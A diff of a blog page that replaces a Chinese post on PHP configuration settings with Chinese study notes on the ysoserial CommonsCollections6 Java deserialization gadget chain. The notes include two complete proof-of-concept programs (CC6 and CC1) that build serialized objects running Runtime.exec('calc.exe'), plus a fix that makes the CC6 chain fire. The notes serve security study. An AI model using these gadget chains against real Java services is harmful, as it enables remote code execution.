@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="PHP,代码审计," />
+  <meta name="keywords" content="JAVA,ysoserial,CC6," />
 
 
 
@@ -79,19 +79,22 @@
 
 
 
-<meta name="description" content="PHP核心配置">
+<meta name="description" content="java漫谈笔记-反序列化篇-CC6参考文章为phith0n【代码审计】知识星球中JAVA安全漫谈部分部分内容摘抄与阅读笔记。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP核心配置">
-<meta property="og:url" content="http://example.com/2021/09/04/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/index.html">
+<meta property="og:title" content="java漫谈笔记-反序列化篇-CC6">
+<meta property="og:url" content="http://example.com/2022/03/10/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC6/index.html">
 <meta property="og:site_name" content="Recoder">
-<meta property="og:description" content="PHP核心配置">
+<meta property="og:description" content="java漫谈笔记-反序列化篇-CC6参考文章为phith0n【代码审计】知识星球中JAVA安全漫谈部分部分内容摘抄与阅读笔记。">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-09-04T08:12:11.000Z">
-<meta property="article:modified_time" content="2021-09-04T08:12:11.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220310075005.png">
+<meta property="article:published_time" content="2022-03-10T00:04:01.000Z">
+<meta property="article:modified_time" content="2022-03-10T00:04:01.000Z">
 <meta property="article:author" content="Laplace">
-<meta property="article:tag" content="PHP">
-<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="ysoserial">
+<meta property="article:tag" content="CC6">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220310075005.png">
 
 
 
@@ -121,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/09/04/PHP核心配置/"/>
+  <link rel="canonical" href="http://example.com/2022/03/10/java漫谈笔记-反序列化篇-CC6/"/>
 
 
 
 
 
-  <title>PHP核心配置 | Recoder</title>
+  <title>java漫谈笔记-反序列化篇-CC6 | Recoder</title>
   
 
 
@@ -288,7 +291,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/04/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Laplace">
@@ -305,7 +308,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PHP核心配置</h1>
+          <h1 class="post-title" itemprop="name headline">java漫谈笔记-反序列化篇-CC6</h1>
         
 
         <div class="post-meta">
@@ -317,8 +320,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-04T16:12:11+08:00">
-                2021-09-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-10T08:04:01+08:00">
+                2022-03-10
               </time>
             
 
@@ -338,8 +341,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
-                    <span itemprop="name">代码审计</span>
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">JAVA安全</span>
                   </a>
                 </span>
 
@@ -375,88 +378,28 @@
       
 
       
-        <p>PHP核心配置</p>
+        <h1 id="java漫谈笔记-反序列化篇-CC6"><a href="#java漫谈笔记-反序列化篇-CC6" class="headerlink" title="java漫谈笔记-反序列化篇-CC6"></a>java漫谈笔记-反序列化篇-CC6</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a target="_blank" rel="noopener" href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
 <span id="more"></span>
 
-<p>2021年7月13日</p>
-<p>10:58</p>
-<ul>
-<li>配置的可修改范围</li>
-</ul>
-<p>PHP_INI_USER        可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </p>
-<p>PHP_INI_PERDIR        可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
-<p>PHP_INI_SYSTEM        可在 php.ini 或 httpd.conf 中设定</p>
-<p>PHP_INI_ALL        可在任何地方设定</p>
-<p>php.ini only    仅在php.ini中设置</p>
-<ul>
-<li>核心配置选项<ul>
-<li>register_globals</li>
-</ul>
-</li>
-</ul>
-<p>说明:该选项在on情况下，会将用户GET,POST提交上的参数自动注册为全局变量，并且初始化为对应的值。</p>
-<p>版本变换:PHP &lt;= 4.2.3范围为PHP_INI_ALL, 在PHP5.3.0开始默认关闭 ， PHP 5.4.0移除该选项。</p>
-<p>例子:</p>
-<?php
+<p>在yso中cc6的利用链如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashSet.readObject()</span><br><span class="line">               java.util.HashMap.put()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-if($user=admin)
+<p>通过使用<code>TiedMapEntry</code>的<code>getValue</code>方法，调用LazyMap的get方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>而用通过<code>TiedMapEntry</code>的<code>hashCode</code>方法来调用<code>getValue</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>为了方便，我们不使用<code>HashSet</code>.而是与最开始的<code>URLDNS</code>相同，使用<code>HashMap</code>反序列化中<code>readObject</code>的最后的<code>Put</code>中有<code>hashCode</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-echo 123;
+<p>接着把序列化链构造出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        Transformer [] fakeTransformer = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, transformerChain);</span><br><span class="line">        TiedMapEntry tem  =<span class="keyword">new</span> TiedMapEntry(outermap, <span class="string">&quot;keykey&quot;</span>) ;</span><br><span class="line">        HashMap exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tem , <span class="string">&quot;xyz&quot;</span>);</span><br><span class="line">		<span class="comment">//最后将恶意链放入</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(transformerChain , transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">                ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-?>
+<p>运行后发现没有弹出计算器。<br>调试后发现在<code>LazyMap</code>的<code>get</code>方法中map以及包含了”keykey”这个键值。无法进入transform方法。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220310075005.png"></p>
+<p>当给TiedMap初始化之后，它会自己将<code>key</code>传入LazyMap所以我们在最后删除LazyMap中的<code>key</code>即可。</p>
+<p>最后完整的POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Runtime.getRuntime();</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class , Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class , Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]</span><br><span class="line">            &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>xx.php?user=admin运行时会输出123</p>
-<ul>
-<li>allow_url_include</li>
-</ul>
-<p>说明:开启情况下，运行包含远程文件.</p>
-<p>版本变化: PHP 5.2.0后默认关闭</p>
-<ul>
-<li>magic_quotes_gpc</li>
-</ul>
-<p>说明:开启后会在GET , POST, COOKIE 变量中 ‘ “  \ null 字符前加入,但是并不会过滤$_SERVER变量。</p>
-<p>版本变化:PHP 5.3后默认关闭 , 5.4之后取消 ， 在&lt;=4.2.3时,配置范围为 PHP_INI_ALL</p>
-<ul>
-<li>magic_quotes_runtime</li>
-</ul>
-<p>说明:与_gpc相同，只不过只对文件和数据库中获取的数据转义。</p>
-<p>版本变化:5.4后取消</p>
-<p>特点:只有部分函数受影响</p>
-<ul>
-<li>magic_quotes_sybase</li>
-</ul>
-<p>说明:会将GET,POST, Cookie的传递的单引号(‘)变为(“)，并转义null字符.</p>
-<p>配置范围: PHP_INI_ALL</p>
-<p>版本: 5.4.0后移除</p>
-<p>特点:当开启后会覆盖_gpc = on;</p>
-<ul>
-<li>safe_mode(安全模式)</li>
-</ul>
-<p>配置范围:PHP_INI_SYSTEM</p>
-<p>版本: 5.4.0之后被取消</p>
-<p>说明:</p>
-<ul>
-<li><p>所有文件操作会受限制</p>
-</li>
-<li><p>popen(), system(), exec()等命令执行函数会受限制</p>
-</li>
-<li><p>open_basedir</p>
-</li>
-</ul>
-<p>说明:限制PHP可以访问的目录</p>
-<p>配置范围:&lt;2.2.3 PHP_INI_SYSTEM ，  &gt;= 5.2.3 PHP_INI_ALL</p>
-<p>特点:对于目录要以/闭合，如 open_basedir = www/a,那么可以访问www/a 和www/b。</p>
-<p>因此合理的写法为www/a/</p>
-<ul>
-<li>diable_functions</li>
-</ul>
-<p>说明:禁止php函数应用</p>
-<p>范围:php.ini</p>
-<ul>
-<li>display_errors  , error_reporting</li>
-</ul>
-<p>说明:关闭 _errors关闭会取消错误显示，当开启时配合_reporting可以控制错误显示级别.</p>
-<p>配置范围:PHP_INI_ALL</p>
+
 
       
     </div>
@@ -474,9 +417,11 @@ echo 123;
       
         <div class="post-tags">
           
-            <a href="/tags/PHP/" rel="tag"># PHP</a>
+            <a href="/tags/JAVA/" rel="tag"># JAVA</a>
           
-            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+            <a href="/tags/ysoserial/" rel="tag"># ysoserial</a>
+          
+            <a href="/tags/CC6/" rel="tag"># CC6</a>
           
         </div>
       
@@ -489,8 +434,8 @@ echo 123;
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/09/03/Tcp_ip%E5%8D%8F%E8%AE%AE%2012.2TCP%E7%9A%84%E5%BC%95%E5%85%A5/" rel="next" title="Tcp_ip协议 12.2TCP的引入">
-                <i class="fa fa-chevron-left"></i> Tcp_ip协议 12.2TCP的引入
+              <a href="/2022/03/08/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC1-lazyMap/" rel="next" title="java漫谈笔记-反序列化篇-CC1-lazyMap">
+                <i class="fa fa-chevron-left"></i> java漫谈笔记-反序列化篇-CC1-lazyMap
               </a>
             
           </div>
@@ -498,10 +443,6 @@ echo 123;
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/09/06/Tcp_ip%E5%8D%8F%E8%AE%AE%2013.2%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%E5%92%8C%E7%BB%88%E6%AD%A2/" rel="prev" title="Tcp_ip协议 13.2连接的建立和终止">
-                Tcp_ip协议 13.2连接的建立和终止 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -553,8 +494,17 @@ echo 123;
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -614,6 +564,22 @@ echo 123;
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC6"><span class="nav-number">1.</span> <span class="nav-text">java漫谈笔记-反序列化篇-CC6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.1.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
